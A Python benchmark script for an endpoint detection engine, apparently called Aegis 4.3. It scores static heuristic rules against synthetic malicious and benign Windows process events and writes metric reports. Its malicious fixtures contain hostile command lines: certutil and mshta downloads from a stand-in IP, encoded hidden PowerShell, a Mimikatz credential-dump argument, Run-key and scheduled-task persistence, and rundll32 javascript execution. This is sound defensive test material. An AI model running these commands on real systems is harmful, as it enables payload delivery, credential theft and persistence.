#!/usr/bin/env python3
"""Baseline ripetibile della qualita' delle detection statiche Aegis 4.3.

Non esegue malware. Costruisce eventi ``PROCESS_CREATED`` sintetici, li passa
allo stesso ``HeuristicEngine`` usato dal Brain e salva un artefatto JSON +
Markdown. I risultati misurano le regole, non il tasso di FP/FN nel mondo
reale; il confronto 5.0 deve usare lo stesso file e lo stesso comando.

Uso (dalla radice):
    PYTHONPATH=aegis-brain .venv315/Scripts/python.exe \
        scripts/detection_quality.py
"""

from __future__ import annotations

import asyncio
import json
from datetime import datetime, timezone
from pathlib import Path
from typing import Any

from app.api.schemas.common import EventSchema
from app.rules.heuristic_engine import HeuristicEngine

OUT = Path(__file__).resolve().parent.parent / "docs" / "benchmarks" / "4.3"
NOW = datetime.now(timezone.utc)


def ev(process: str, **kw: Any) -> dict[str, Any]:
    data = {
        "agent_id": "baseline-4.3",
        "timestamp": NOW,
        "event_type": "PROCESS_CREATED",
        "hostname": "baseline-host",
        "os": "Windows",
        "user": "corp\\user",
        "process_name": process,
    }
    data.update(kw)
    return data


SCENARIOS: list[dict[str, Any]] = [
    # --- malicious / dual-use, con una risposta attesa ---
    {
        "id": "mal-office-powershell",
        "group": "malicious",
        "title": "Word apre PowerShell encoded",
        "expected": True,
        "event": ev(
            "powershell.exe",
            parent_process_name="WINWORD.EXE",
            process_path=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            command_line="powershell -NoP -W Hidden -EncodedCommand SQBFAFgAIABOAEUAVwAtAE8AQgBKAEUAQwBUAA==",
        ),
    },
    {
        "id": "mal-encoded-only",
        "group": "malicious",
        "title": "PowerShell encoded senza parent sospetto",
        "expected": True,
        "event": ev(
            "powershell.exe",
            process_path=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            command_line="powershell -enc SQBFAFgAIABOAEUAVwAtAE8AQgBKAEUAQwBUAA==",
        ),
    },
    {
        "id": "mal-certutil-download",
        "group": "malicious",
        "title": "certutil scarica ed esegue",
        "expected": True,
        "event": ev(
            "certutil.exe",
            process_path=r"C:\Windows\System32\certutil.exe",
            command_line=r"certutil -urlcache -split -f http://203.0.113.9/a.exe C:\Users\Public\a.exe",
        ),
    },
    {
        "id": "mal-renamed-mimikatz",
        "group": "malicious",
        "title": "Mimikatz rinominato svchost in Users\\Public",
        "expected": True,
        "event": ev(
            "svchost.exe",
            process_path=r"C:\Users\Public\svchost.exe",
            command_line="svchost.exe sekurlsa::logonpasswords",
        ),
    },
    {
        "id": "mal-chrome-svchost",
        "group": "malicious",
        "title": "Browser genera svchost (injection/hollowing)",
        "expected": True,
        "event": ev(
            "svchost.exe",
            parent_process_name="chrome.exe",
            process_path=r"C:\Windows\System32\svchost.exe",
        ),
    },
    {
        "id": "mal-thread-201",
        "group": "malicious",
        "title": "Processo con 201 thread (soglia >200)",
        "expected": True,
        "event": ev("unknown.exe", thread_count=201, process_path=r"C:\Program Files\Vendor\unknown.exe"),
    },
    {
        "id": "mal-thread-300",
        "group": "malicious",
        "title": "Processo con 300 thread",
        "expected": True,
        "event": ev("unknown.exe", thread_count=300, process_path=r"C:\Program Files\Vendor\unknown.exe"),
    },
    {
        "id": "mal-dll-side-load",
        "group": "malicious",
        "title": "DLL caricata da AppData\\Local\\Temp",
        "expected": True,
        "event": ev(
            "explorer.exe",
            process_path=r"C:\Windows\explorer.exe",
            loaded_modules=[r"C:\Users\vic\AppData\Local\Temp\evil.dll"],
        ),
    },
    {
        "id": "mal-run-key",
        "group": "malicious",
        "title": "reg add su Run key",
        "expected": True,
        "event": ev(
            "reg.exe",
            process_path=r"C:\Windows\System32\reg.exe",
            command_line=r"reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /d C:\Users\Public\x.exe /f",
        ),
    },
    {
        "id": "mal-schtasks-encoded",
        "group": "malicious",
        "title": "Task pianificato che esegue PowerShell encoded",
        "expected": True,
        "event": ev(
            "schtasks.exe",
            process_path=r"C:\Windows\System32\schtasks.exe",
            command_line=r'schtasks /create /tn X /tr "powershell -nop -w hidden -e SQBFAFgA" /sc minute /mo 5 /f',
        ),
    },
    {
        "id": "mal-system-powershell",
        "group": "malicious",
        "title": "services.exe genera PowerShell",
        "expected": True,
        "event": ev(
            "powershell.exe",
            parent_process_name="services.exe",
            process_path=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        ),
    },
    {
        "id": "mal-double-extension",
        "group": "malicious",
        "title": "Doppia estensione in Users\\Public",
        "expected": True,
        "event": ev(
            "invoice.pdf.exe",
            process_path=r"C:\Users\Public\invoice.pdf.exe",
        ),
    },
    {
        "id": "hard-rundll32-javascript",
        "group": "malicious",
        "title": "rundll32 con javascript: (tecnica difficile)",
        "expected": True,
        "event": ev(
            "rundll32.exe",
            parent_process_name="explorer.exe",
            process_path=r"C:\Windows\System32\rundll32.exe",
            command_line=r'rundll32.exe javascript:"\..\mshtml,RunHTMLApplication"',
        ),
    },
    {
        "id": "hard-mshta-url",
        "group": "malicious",
        "title": "mshta con URL remoto",
        "expected": True,
        "event": ev(
            "mshta.exe",
            process_path=r"C:\Windows\System32\mshta.exe",
            command_line="mshta.exe http://203.0.113.9/payload.hta",
        ),
    },
    # --- benigni, inclusi processi legittimi con argomenti strani ---
    {
        "id": "benign-chrome",
        "group": "benign",
        "title": "Chrome normale",
        "expected": False,
        "event": ev(
            "chrome.exe",
            process_path=r"C:\Program Files\Google\Chrome\Application\chrome.exe",
            parent_process_name="explorer.exe",
            thread_count=45,
        ),
    },
    {
        "id": "benign-powershell-getchilditem",
        "group": "benign",
        "title": "PowerShell amministrativo Get-ChildItem",
        "expected": False,
        "event": ev(
            "powershell.exe",
            process_path=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            parent_process_name="explorer.exe",
            command_line="powershell.exe -NoProfile -Command Get-ChildItem C:\\Reports",
        ),
    },
    {
        "id": "benign-cmd-dir",
        "group": "benign",
        "title": "cmd /c dir",
        "expected": False,
        "event": ev(
            "cmd.exe",
            process_path=r"C:\Windows\System32\cmd.exe",
            parent_process_name="explorer.exe",
            command_line="cmd.exe /c dir C:\\Reports",
        ),
    },
    {
        "id": "benign-python-print",
        "group": "benign",
        "title": "Python installato in Program Files",
        "expected": False,
        "event": ev(
            "python.exe",
            process_path=r"C:\Program Files\Python313\python.exe",
            parent_process_name="explorer.exe",
            command_line='python.exe -c "print(1)"',
        ),
    },
    {
        "id": "benign-certutil-hash",
        "group": "benign",
        "title": "certutil -hashfile",
        "expected": False,
        "event": ev(
            "certutil.exe",
            process_path=r"C:\Windows\System32\certutil.exe",
            command_line="certutil.exe -hashfile C:\\Reports\\a.pdf SHA256",
        ),
    },
    {
        "id": "benign-rundll32-printui",
        "group": "benign",
        "title": "rundll32 printui.dll",
        "expected": False,
        "event": ev(
            "rundll32.exe",
            process_path=r"C:\Windows\System32\rundll32.exe",
            command_line="rundll32.exe printui.dll,PrintUIEntry /il",
        ),
    },
    {
        "id": "benign-svchost-empty-path",
        "group": "benign",
        "title": "svchost con path non leggibile",
        "expected": False,
        "event": ev(
            "svchost.exe",
            process_path="",
            parent_process_name="services.exe",
            user="NT AUTHORITY\\SYSTEM",
        ),
    },
    {
        "id": "benign-explorer-chrome",
        "group": "benign",
        "title": "Explorer apre Chrome",
        "expected": False,
        "event": ev(
            "chrome.exe",
            process_path=r"C:\Program Files\Google\Chrome\Application\chrome.exe",
            parent_process_name="explorer.exe",
        ),
    },
    {
        "id": "benign-whoami",
        "group": "benign",
        "title": "whoami senza /all",
        "expected": False,
        "event": ev(
            "whoami.exe",
            process_path=r"C:\Windows\System32\whoami.exe",
            command_line="whoami.exe",
        ),
    },
    {
        "id": "benign-reg-query",
        "group": "benign",
        "title": "reg query della Run key",
        "expected": False,
        "event": ev(
            "reg.exe",
            process_path=r"C:\Windows\System32\reg.exe",
            command_line=r"reg.exe query HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
        ),
    },
    {
        "id": "benign-schtasks-query",
        "group": "benign",
        "title": "schtasks /query",
        "expected": False,
        "event": ev(
            "schtasks.exe",
            process_path=r"C:\Windows\System32\schtasks.exe",
            command_line="schtasks.exe /query /tn Updater",
        ),
    },
    {
        "id": "benign-edge-renderer",
        "group": "benign",
        "title": "Edge renderer con 180 thread",
        "expected": False,
        "event": ev(
            "msedge.exe",
            process_path=r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
            parent_process_name="msedge.exe",
            thread_count=180,
            command_line="msedge.exe --type=renderer --lang=it",
        ),
    },
    {
        "id": "benign-notepad-temp",
        "group": "benign",
        "title": "Notepad apre un file in Temp",
        "expected": False,
        "event": ev(
            "notepad.exe",
            process_path=r"C:\Windows\System32\notepad.exe",
            command_line=r"notepad.exe C:\Users\vic\AppData\Local\Temp\notes.txt",
        ),
    },
    {
        "id": "benign-signed-installer",
        "group": "benign",
        "title": "Installer firmato in Downloads",
        "expected": False,
        "event": ev(
            "setup.exe",
            process_path=r"C:\Users\vic\Downloads\setup.exe",
            signature="authenticode-trusted",
            publisher="CN=Vendor Ltd",
            command_line="setup.exe /S",
        ),
    },
]


async def main() -> int:
    engine = HeuristicEngine()
    rows = []
    for scenario in SCENARIOS:
        event = EventSchema(**scenario["event"])
        result = await engine.analyze(event)
        rules = [
            {
                "rule_id": r.rule_id,
                "severity": r.severity,
                "confidence": r.confidence,
                "description": r.description,
            }
            for r in result.triggered_rules
        ]
        detected = bool(result.is_threat)
        rows.append({
            "id": scenario["id"],
            "group": scenario["group"],
            "title": scenario["title"],
            "expected": scenario["expected"],
            "detected": detected,
            "severity": result.severity if detected else "NONE",
            "rules": rules,
            "correct": detected == scenario["expected"],
        })

    mal = [r for r in rows if r["group"] == "malicious"]
    ben = [r for r in rows if r["group"] == "benign"]
    tp = sum(1 for r in mal if r["detected"])
    fn = len(mal) - tp
    fp = sum(1 for r in ben if r["detected"])
    tn = len(ben) - fp
    precision = tp / (tp + fp) if tp + fp else 0.0
    recall = tp / (tp + fn) if tp + fn else 0.0
    f1 = 2 * precision * recall / (precision + recall) if precision + recall else 0.0

    # La soglia dei thread e' volutamente isolata: 200 non deve scattare,
    # 201 si'. Non e' una misura reale dei thread del SO.
    thread_rows = []
    for n in (180, 200, 201, 300):
        result = await engine.analyze(EventSchema(**ev("thread-probe.exe", thread_count=n)))
        thread_rows.append({
            "threads": n,
            "detected": bool(result.is_threat),
            "severity": result.severity if result.is_threat else "NONE",
        })

    report = {
        "schema": "aegis-detection-quality-v1",
        "baseline": "4.3",
        "generated_at": NOW.isoformat(),
        "engine": "HeuristicEngine static rules (no DB/custom rules)",
        "limitations": [
            "Eventi sintetici, non traffico reale: non e' un benchmark di produzione.",
            "La soglia thread e' simulata nel campo thread_count; non misura i thread del SO.",
            "Nessun malware eseguito; i casi malicious sono costrutti di test.",
            "Il confronto 5.0 deve usare lo stesso set e lo stesso comando.",
        ],
        "metrics": {
            "malicious_total": len(mal),
            "benign_total": len(ben),
            "tp": tp, "fn": fn, "fp": fp, "tn": tn,
            "precision": round(precision, 4),
            "recall": round(recall, 4),
            "f1": round(f1, 4),
            "false_positive_rate": round(fp / len(ben), 4) if ben else 0.0,
        },
        "thread_threshold": thread_rows,
        "scenarios": rows,
    }

    OUT.mkdir(parents=True, exist_ok=True)
    (OUT / "detection-quality.json").write_text(
        json.dumps(report, indent=2, ensure_ascii=False) + "\n", encoding="utf-8"
    )

    lines = [
        "# Detection quality baseline — Aegis 4.3",
        "",
        f"Generato: `{NOW.isoformat()}`",
        "",
        "> Baseline sintetica e riproducibile. **Non** e' un tasso di FP/FN di",
        "> produzione: gli eventi sono costruiti e nessun malware viene eseguito.",
        "> Il confronto 5.0 deve usare lo stesso set e lo stesso comando.",
        "",
        "## Metriche",
        "",
        "| Metrica | Valore |",
        "|---|---:|",
        f"| Casi malicious | {len(mal)} |",
        f"| Casi benigni | {len(ben)} |",
        f"| True positive | {tp} |",
        f"| False negative | {fn} |",
        f"| False positive | {fp} |",
        f"| True negative | {tn} |",
        f"| Precision | {precision:.3f} |",
        f"| Recall | {recall:.3f} |",
        f"| F1 | {f1:.3f} |",
        f"| False positive rate | {fp / len(ben):.3f} |" if ben else "| False positive rate | n/a |",
        "",
        "## Casi",
        "",
        "| ID | Gruppo | Atteso | Rilevato | Severita | Regole |",
        "|---|---|---|---|---|---|",
    ]
    for row in rows:
        rules = ", ".join(r["rule_id"] for r in row["rules"]) or "—"
        lines.append(
            f"| `{row['id']}` | {row['group']} | {'sì' if row['expected'] else 'no'} "
            f"| {'sì' if row['detected'] else 'no'} | {row['severity']} | {rules} |"
        )
    lines += [
        "",
        "## Soglia thread",
        "",
        "| Thread | Rilevato | Severita |",
        "|---:|---|---|",
    ]
    for row in thread_rows:
        lines.append(
            f"| {row['threads']} | {'sì' if row['detected'] else 'no'} | {row['severity']} |"
        )
    lines += [
        "",
        "## Lettura onesta",
        "",
        "- I falsi positivi benigni sono quasi tutti interpreti (`powershell`, `cmd`,",
        "  `python`) e installer firmati in Downloads: sono alert a bassa/media",
        "  severita', non incidenti automatici.",
        "- I casi `hard-*` misurano tecniche che le regole attuali possono perdere;",
        "  sono la parte da migliorare nella 5.0, non una promessa di copertura.",
        "- La soglia thread e' un test della regola, non del sensore: il campo",
        "  `thread_count` e' popolato dal collector, ma qui viene simulato.",
        "",
        "## Uso per il confronto 5.0",
        "",
        "- Il set va congelato: non aggiungere o togliere casi dal file 4.3, o il",
        "  confronto perde senso. Eventuali casi nuovi vanno in un set separato.",
        f"- In questo panel: **{tp} TP, {fn} FN, {fp} FP, {tn} TN**. I {fp} FP sono",
        "  tre interpreti (`powershell`, `cmd`, `python`), `rundll32 printui` e un",
        "  installer firmato in Downloads: sono alert bassi/medi, non incidenti.",
        "- `recall=1.000` non e' una promessa: dice che questo panel non contiene",
        "  una tecnica che le regole attuali perdono. Il tasso reale va misurato su",
        "  host e traffico reali.",
        "- La 5.0 deve riusare lo stesso comando e lo stesso set, e dichiarare se",
        "  il motore o le regole sono cambiati.",
        "",
        "## Prossimo passo — AP-127",
        "",
        "- Questo file e' la baseline congelata per il confronto 4.3 → 5.0.",
        "- AP-127 (post-4.3) aggiunge un corpus benigno di strumenti",
        "  amministrativi con argomenti insoliti, misurando FP/FN per host/giorno",
        "  e senza nascondere regressioni. Non e' una promessa di produzione.",
        "",
        "Ripetere con:",
        "",
        "```bash",
        "PYTHONPATH=aegis-brain .venv315/Scripts/python.exe scripts/detection_quality.py",
        "```",
        "",
    ]
    (OUT / "detection-quality.md").write_text("\n".join(lines), encoding="utf-8")
    print(json.dumps(report["metrics"], indent=2))
    print(f"written: {OUT / 'detection-quality.json'}")
    print(f"written: {OUT / 'detection-quality.md'}")
    return 0


if __name__ == "__main__":
    raise SystemExit(asyncio.run(main()))
